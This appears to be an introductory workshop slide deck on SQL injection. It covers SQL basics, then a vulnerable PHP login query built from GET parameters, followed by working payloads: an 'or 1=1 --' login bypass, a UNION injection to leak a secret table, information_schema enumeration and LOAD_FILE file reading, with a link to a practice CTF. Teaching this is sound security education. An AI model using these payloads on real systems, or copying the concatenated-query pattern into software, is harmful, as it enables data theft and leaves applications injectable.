class: middle

.center.responsive[
![Logo](https://imgur.com/JR7UeOu.jpg)]

---

# Baby' or 1=1 -- first SQL Injection

### 🔧 SQL Basics

???

Who's not familiar with SQL? 

(something something Structured Query Language)

--

### 💉 What is an SQLi?

--

### 💣 How to exploit?

---

## 🔧 SQL Basics - SELECT

```SQL
SELECT 1337;
+------+
| 1337 |
+------+
| 1337 |
+------+
```

--

```SQL
SELECT 1337 AS username;
+----------+
| username |
+----------+
|     1337 |
+----------+
```

--

```SQL
SELECT 2 + 2 AS email;
+-------+
| email |
+-------+
|     4 |
+-------+
```

---

## 🔧 SQL Basics - FROM

```SQL
SELECT * FROM users;
+--------+-------------+------------------+---------------------------+
| userid | username    | registrationdate | email                     |
+--------+-------------+------------------+---------------------------+
|      1 | lredington0 | 2018-02-06       | casey0@noaa.gov           |
|      2 | fmalicki1   | 2017-10-11       | jhannah1@gravatar.com     |
|      3 | lbrook2     | 2016-06-14       | latkin2@theatlantic.com   |
+--------+-------------+------------------+---------------------------+
```

--

```SQL
SELECT username, email FROM users;
+-------------+------------------------------------+
| username    | email                              |
+-------------+------------------------------------+
| lredington0 | casey0@noaa.gov                    |
| fmalicki1   | jhannah1@gravatar.com              |
| lbrook2     | latkin2@theatlantic.com            |
+-------------+------------------------------------+
```

---

## 🔧 SQL Basics - WHERE

```SQL
SELECT * FROM users WHERE email = 'casey0@noaa.gov';
+--------+-------------+------------------+---------------------------+
| userid | username    | registrationDate | email                     |
+--------+-------------+------------------+---------------------------+
|      1 | lredington0 | 2018-02-06       | casey0@noaa.gov           |
+--------+-------------+------------------+---------------------------+
```

--


```SQL
SELECT * FROM users WHERE email LIKE '%.com';
+--------+-------------+------------------+---------------------------+
| userid | username    | registrationDate | email                     |
+--------+-------------+------------------+---------------------------+
|      2 | fmalicki1   | 2017-10-11       | jhannah1@gravatar.com     |
|      3 | lbrook2     | 2016-06-14       | latkin2@theatlantic.com   |
+--------+-------------+------------------+---------------------------+
```

---

## 🔧 SQL Basics - UNION

```SQL
SELECT username, email FROM users WHERE userid = 1 
UNION 
SELECT username, email FROM users WHERE userid = 3;
+-------------+-------------------------+
| username    | email                   |
+-------------+-------------------------+
| lredington0 | casey0@noaa.gov         |
| lbrook2     | latkin2@theatlantic.com |
+-------------+-------------------------+
```

--

```SQL
SELECT username, email FROM users WHERE userid = 1 
UNION 
SELECT 'hello' AS username, 'world' AS email;
+-------------+-------------------------+
| username    | email                   |
+-------------+-------------------------+
| lredington0 | casey0@noaa.gov         |
| hello       | world                   |
+-------------+-------------------------+
```

---

## 🔧 SQL Basics - Cool Tricks

```SQL
SELECT * FROM users -- where userid = 1
SELECT * FROM users /* where userid = 1 */
SELECT/**/*/**/FROM/**/users
+--------+-------------+------------------+---------------------------+
| userid | username    | registrationdate | email                     |
+--------+-------------+------------------+---------------------------+
|      1 | lredington0 | 2018-02-06       | casey0@noaa.gov           |
|      2 | fmalicki1   | 2017-10-11       | jhannah1@gravatar.com     |
|      3 | lbrook2     | 2016-06-14       | latkin2@theatlantic.com   |
+--------+-------------+------------------+---------------------------+
```

---

# 💉 What is an SQLi?

```PHP
<?php
...
$user = $_GET['username'];
$pass = $_GET['password'];
$sql = "SELECT * FROM users"
     . "WHERE username = '" . $user . "' AND password = '" . $pass . "';"
...
```

--

`GET /index.php?username=filedesless&password=hunter2`

```SQL
SELECT * FROM users
WHERE username = 'filedesless' AND password = 'hunter2';
```

--

what if someone puts a squiggly boi (') in there?

--

```SQL
SELECT * FROM users
WHERE username = ''' AND password = 'hunter2';
```

`Error Code: 1064. You have an error in your SQL syntax  near 'hunter2'' at line 2`

---

.responsive[![squiggly boi](https://i.imgur.com/LtQWQXm.jpg)]

---

# 💣 How to exploit?


```SQL
SELECT * FROM users
WHERE username = '' or 1 = 1 -- ' AND password = '';
```

--

Since anything or true will always be true, the where clause can be read like this

```SQL
SELECT * FROM users
WHERE true;
```

--

Leaking the entire table

```SQL
+--------+-------------+------------------+---------------------------+
| userid | username    | registrationdate | email                     |
+--------+-------------+------------------+---------------------------+
|      1 | lredington0 | 2018-02-06       | casey0@noaa.gov           |
|      2 | fmalicki1   | 2017-10-11       | jhannah1@gravatar.com     |
|      3 | lbrook2     | 2016-06-14       | latkin2@theatlantic.com   |
+--------+-------------+------------------+---------------------------+
```

---

# 💣 How to exploit?

Could we also leak `secret_table` ?


```SQL
SELECT username from users where username = '$user' AND password = '$pass';
```

--

</br>

That's where we use the `UNION` keyword

```http
POST /index.php

user='UNION SELECT secret_column as username from secret_table -- 
pass=
```

```SQL
SELECT username from users where username = ''
UNION
SELECT secret_column as username from secret_table -- ' AND password = '';
```

---

# 💣 How to exploit?

List tables

```SQL
SELECT table_name FROM information_schema.tables
WHERE table_schema != 'information_schema';
```

--

List columns

```SQL
SELECT column_name FROM information_schema.columns
WHERE table_schema != 'information_schema';
```

--

Read files

```SQL
SELECT LOAD_FILE('/my_secrets.txt')
```

[cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

---

# 🔥 CTF

.center[[https://sqli.filedesless.dev](https://sqli.filedesless.dev)]

.center[![meme](https://i.imgur.com/qtKfTZ2.png)]

